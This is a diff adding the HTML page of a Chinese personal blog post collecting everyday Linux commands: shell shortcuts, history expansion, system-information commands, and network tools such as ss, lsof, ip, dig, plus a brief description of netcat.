@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="29vLVh4vA4suQh5SRMCfQisJ8UugXBkjM46VFkYeonU">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="todo  [toc] 可能你不知道的个人常用命令杂集12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux常用命令草集">
+<meta property="og:url" content="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/index.html">
+<meta property="og:site_name" content="skyler-blog">
+<meta property="og:description" content="todo  [toc] 可能你不知道的个人常用命令杂集12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-29T04:23:22.697Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux常用命令草集">
+<meta name="twitter:description" content="todo  [toc] 可能你不知道的个人常用命令杂集12345678ctrl u 可以删除行内光标所在位置之前的内容 - 常用ctrl l 可以清屏 - 常用ctrl a 可以将光标移至行首ctrl e 可以将光标移至行尾ctrl k 可以删除光标至行尾的所有内容ctrl w 删除你键入的最后一个单词cd - 回到前一个工作路径 特殊符号的应用! -d 检查某个目录是否存在  1234和上面的命">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/">
+
+
+
+
+
+  <title>linux常用命令草集 | skyler-blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?94ae7654e2dc1739de6dffa8904d5c82";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">skyler-blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yaoyuanyy.github.io/2019/10/23/linux常用命令草集/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Skyler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/tao.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="skyler-blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">linux常用命令草集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-23T17:03:26+08:00">
+                2019-10-23
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-29T12:23:22+08:00">
+                2019-10-29
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/10/23/linux常用命令草集/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/23/linux常用命令草集/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/10/23/linux常用命令草集/" class="leancloud_visitors" data-flag-title="linux常用命令草集">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  5.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  25
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>todo </p>
+<p>[toc]</p>
+<h2 id="可能你不知道的个人常用命令杂集"><a href="#可能你不知道的个人常用命令杂集" class="headerlink" title="可能你不知道的个人常用命令杂集"></a>可能你不知道的个人常用命令杂集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctrl u 可以删除行内光标所在位置之前的内容 - 常用</span><br><span class="line">ctrl l 可以清屏 - 常用</span><br><span class="line">ctrl a 可以将光标移至行首</span><br><span class="line">ctrl e 可以将光标移至行尾</span><br><span class="line">ctrl k 可以删除光标至行尾的所有内容</span><br><span class="line">ctrl w 删除你键入的最后一个单词</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> - 回到前一个工作路径</span><br></pre></td></tr></table></figure>
+<h2 id="特殊符号的应用"><a href="#特殊符号的应用" class="headerlink" title="特殊符号的应用"></a>特殊符号的应用</h2><h3 id="d"><a href="#d" class="headerlink" title="! -d"></a>! -d</h3><blockquote>
+<p>检查某个目录是否存在</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">和上面的命令类似。这里是检测目录是否为空，如果为空则退出命令</span><br><span class="line">skyler@bogon  ~/skyler/a [ ! -d /home/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">exit</span></span><br><span class="line">检测目录是否为空，如果为空则创建该目录</span><br><span class="line">skyler@bogon  ~/skyler/a [ ! -d /home/<span class="built_in">test</span>/exist ] &amp;&amp; mkdir /home/<span class="built_in">test</span>/exist</span><br></pre></td></tr></table></figure>
+<h3 id=""><a href="#" class="headerlink" title="!$"></a>!$</h3><blockquote>
+<p>将上一条命令的参数传递给下一条命令参数</p>
+</blockquote>
+<p>当这个参数特别长的时候此命令特别有用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/skyler/a 201910  <span class="built_in">cd</span> /Users/skyler/skyler/a</span><br><span class="line">skyler@bogon  ~/skyler/a 201910  ll !$</span><br><span class="line">skyler@bogon  ~/skyler/a 201910  ll /Users/skyler/skyler/a</span><br><span class="line">total 64</span><br><span class="line">-rw-r--r--  1 skyler  staff   346B  8  8 11:55 Dockerfile</span><br><span class="line">-rw-r--r--  1 skyler  staff   249B  8  9 14:16 README.md</span><br></pre></td></tr></table></figure>
+<h3 id="-1"><a href="#-1" class="headerlink" title="!!"></a>!!</h3><blockquote>
+<p>执行上一条命令</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># cat test.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span> <span class="variable">$0</span> <span class="variable">$1</span></span><br><span class="line">aaa=111</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># !!</span></span><br><span class="line">cat test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$#</span> <span class="variable">$0</span> <span class="variable">$1</span></span><br><span class="line">aaa=111</span><br></pre></td></tr></table></figure>
+<h3 id="从历史记录中使用命令号来运行命令"><a href="#从历史记录中使用命令号来运行命令" class="headerlink" title="从历史记录中使用命令号来运行命令"></a>从历史记录中使用命令号来运行命令</h3><p>首先输入 “<strong>history</strong>” 命令得到命令的序号</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin <span class="built_in">history</span></span><br><span class="line">10063* [ ! d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10064* [ diff ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10065* [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br><span class="line">10066* [ ! -d ~/bin ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<p>然后通过每行前的序号结合!来执行此行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin  !10065</span><br><span class="line">skyler@bogon  ~/bin  [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<p>还可以使用!-n, n为数字</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">skyler@bogon  ~/bin  !-2</span><br><span class="line">skyler@bogon  ~/bin  [ ! -d ~/<span class="built_in">test</span>/exist ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"no"</span></span><br></pre></td></tr></table></figure>
+<h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc: 系统信息</span><br><span class="line">uname:</span><br></pre></td></tr></table></figure>
+<h3 id="cat-proc-系统信息"><a href="#cat-proc-系统信息" class="headerlink" title="cat /proc 系统信息"></a>cat /proc 系统信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/&#123;xxx&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="uname"><a href="#uname" class="headerlink" title="uname"></a>uname</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -a</span><br><span class="line">Linux aizbp11lqlgyf2g31fgs4hg 3.10.0-693.2.2.el7.x86_64 #1 SMP Tue Sep 12 22:26:13 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">查看主机名</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]# uname -n</span><br><span class="line">aizbp11lqlgyf2g31fgs4hg</span><br><span class="line"></span><br><span class="line">查看linux发行版及版本号</span><br><span class="line">方法一</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.4.1708 (Core)</span><br><span class="line"></span><br><span class="line">方法二</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# cat /etc/os-release</span><br><span class="line">NAME=&quot;CentOS Linux&quot;</span><br><span class="line">VERSION=&quot;7 (Core)&quot;</span><br><span class="line">ID=&quot;centos&quot;</span><br><span class="line">ID_LIKE=&quot;rhel fedora&quot;</span><br><span class="line">VERSION_ID=&quot;7&quot;</span><br><span class="line">PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;</span><br><span class="line">ANSI_COLOR=&quot;0;31&quot;</span><br><span class="line">CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;</span><br><span class="line">HOME_URL=&quot;https://www.centos.org/&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;</span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;</span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;</span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;</span><br><span class="line"></span><br><span class="line">方法三</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg /]# lsb_release  -a</span><br><span class="line">LSB Version:	:core-4.1-amd64:core-4.1-noarch</span><br><span class="line">Distributor ID:	CentOS</span><br><span class="line">Description:	CentOS Linux release 7.4.1708 (Core)</span><br><span class="line">Release:	7.4.1708</span><br><span class="line">Codename:	Core</span><br></pre></td></tr></table></figure>
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="网络连接-进程端口"><a href="#网络连接-进程端口" class="headerlink" title="网络连接(进程端口)"></a>网络连接(进程端口)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ss：查看网络连接</span><br><span class="line">lsof：查看网络连接</span><br></pre></td></tr></table></figure>
+<h4 id="ss"><a href="#ss" class="headerlink" title="ss"></a>ss</h4><p>查看网络连接，代替netstat命令，使用更简洁。</p>
+<p>可以查看pid和服务端口的对应关系</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># ss -ptl</span></span><br><span class="line">State      Recv-Q Send-Q                                                                                         Local Address:Port                                                                                                          Peer Address:Port</span><br><span class="line">LISTEN     0      128                                                                                                   *:ssh                                                                                                                      *:*                     users:((<span class="string">"sshd"</span>,pid=1329,fd=3))</span><br><span class="line">LISTEN     0      1                                                                                                  127.0.0.1:32000                                                                                                                    *:*                     users:((<span class="string">"java"</span>,pid=17595,fd=3))</span><br><span class="line">LISTEN     0      128                                                                                                       :::lanmessenger                                                                                                            :::*                     users:((<span class="string">"docker-proxy-cu"</span>,pid=2937,fd=4))</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># ss -ptln|grep 20282</span></span><br><span class="line">LISTEN     0      100          *:20282                    *:*                   users:((<span class="string">"java"</span>,pid=17470,fd=21))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><code>ss</code> 真正耀眼的地方是其内置的过滤能力</p>
+</blockquote>
+<p>只想看已建立的 socket（排除了 <em>listening</em> 和 <em>closed</em> ）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ss state connected sport = :ssh</span><br><span class="line">Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540</span><br></pre></td></tr></table></figure>
+<p>列出指定的 host 或者 ip 段。例如，列出到达 74.125.0.0/16 子网的连接，这个子网属于 Google</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ss state all dst 74.125.0.0/16</span><br><span class="line">Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:33616                   74.125.142.189:https</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:42034                    74.125.70.189:https</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:57408                   74.125.202.189:https</span><br></pre></td></tr></table></figure>
+<h4 id="lsof-list-open-files"><a href="#lsof-list-open-files" class="headerlink" title="lsof - list open files"></a>lsof - list open files</h4><blockquote>
+<p>非常实用的系统级的监控、诊断工具</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">查看指定端口有哪些进程在使用 lsof -i:PORT（lsof -i 列出所有的打开的网络连接） </span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># lsof -i:32000</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">wrapper  1105 root    6u  IPv4 53752676      0t0  TCP localhost:32000-&gt;localhost:31001 (ESTABLISHED)</span><br><span class="line">java    17595 root    3u  IPv4 53752648      0t0  TCP localhost:32000 (LISTEN)</span><br><span class="line">java    17595 root   28u  IPv4 53752674      0t0  TCP localhost:31001-&gt;localhost:32000 (ESTABLISHED)</span><br><span class="line"></span><br><span class="line">查看指定进程pid打开的文件 losf -p pid</span><br><span class="line">[root@aizbp11lqlgyf2g31fgs4hg ~]<span class="comment"># lsof -p 17595</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE             DEVICE  SIZE/OFF     NODE NAME</span><br><span class="line">java    17595 root  mem    REG              253,1   1078737  1313486 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-core-4.2.4.RELEASE.jar</span><br><span class="line">java    17595 root  mem    REG              253,1   1097552  1313482 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-context-4.2.4.RELEASE.jar</span><br><span class="line">java    17595 root  mem    REG              253,1    731512  1313485 /usr/<span class="built_in">local</span>/cloudmonitor/lib/spring-beans-4.2.4.RELEASE.jar</span><br><span class="line"></span><br><span class="line">列出被某个进程打开所有的网络文件</span><br><span class="line">lsof -i -a -p 234</span><br><span class="line"></span><br><span class="line">查看指定主机有哪些进程在使用</span><br><span class="line">lsof -i@192.168.1.91</span><br><span class="line"></span><br><span class="line">查看指定用戶打开的文件</span><br><span class="line">lsof -u messagebus</span><br><span class="line"></span><br><span class="line">查看指定程序打开的文件</span><br><span class="line">lsof -c firefox</span><br><span class="line"></span><br><span class="line">查看被删除的文件。有些删了的文件，但是进程没reload，那些空间还是占用的</span><br><span class="line">lsof|grep -i delete</span><br></pre></td></tr></table></figure>
+<h3 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip：</span><br><span class="line">ifconfig：</span><br><span class="line">dig：</span><br></pre></td></tr></table></figure>
+<h4 id="ip-show-manipulate-routing-devices-policy-routing-and-tunnels"><a href="#ip-show-manipulate-routing-devices-policy-routing-and-tunnels" class="headerlink" title="ip - show / manipulate routing, devices, policy routing and tunnels"></a>ip - show / manipulate routing, devices, policy routing and tunnels</h4><blockquote>
+<p>ip 意在取代ifconfig</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# ip addr|grep eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    inet 172.16.68.43/20 brd 172.16.79.255 scope global dynamic eth0</span><br></pre></td></tr></table></figure>
+<h4 id="ifconfig-configure-a-network-interface"><a href="#ifconfig-configure-a-network-interface" class="headerlink" title="ifconfig - configure a network interface"></a>ifconfig - configure a network interface</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg /]# ifconfig |grep inet</span><br><span class="line">        inet 172.20.0.1  netmask 255.255.0.0  broadcast 172.20.255.255</span><br><span class="line">        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet 172.16.68.43  netmask 255.255.240.0  broadcast 172.16.79.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br></pre></td></tr></table></figure>
+<h4 id="dig-DNS-lookup-utility"><a href="#dig-DNS-lookup-utility" class="headerlink" title="dig - DNS lookup utility"></a>dig - DNS lookup utility</h4><blockquote>
+<p>DNS查找工具</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dig 从DNS域名服务器查询指定主机信息</span><br><span class="line">dig baidu.com</span><br><span class="line"></span><br><span class="line">从指定的 DNS 服务器上查询</span><br><span class="line">dig @8.8.8.8 abc.filterinto.com</span><br><span class="line"></span><br><span class="line">跟踪整个查询过程</span><br><span class="line">如果你好奇 dig 命令执行查询时都经历了哪些过程，你可以尝试使用 +trace 选项。它会输出从根域到最终结果的所有信息：</span><br><span class="line">$ dig +trace abc.filterinto.com</span><br></pre></td></tr></table></figure>
+<h3 id="网络调试-网络诊断"><a href="#网络调试-网络诊断" class="headerlink" title="网络调试(网络诊断)"></a>网络调试(网络诊断)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wireshark：</span><br><span class="line">nc：</span><br><span class="line">mtr：</span><br></pre></td></tr></table></figure>
+<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><blockquote>
+<p>强大的可视化工具 一定要会用 todo</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark</span><br></pre></td></tr></table></figure>
+<h4 id="nc-netcat-Concatenate-and-redirect-sockets"><a href="#nc-netcat-Concatenate-and-redirect-sockets" class="headerlink" title="nc - netcat - Concatenate and redirect sockets"></a>nc - netcat - Concatenate and redirect sockets</h4><blockquote>
+<p>既可以网络调试又数据传输, 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀</p>
+</blockquote>
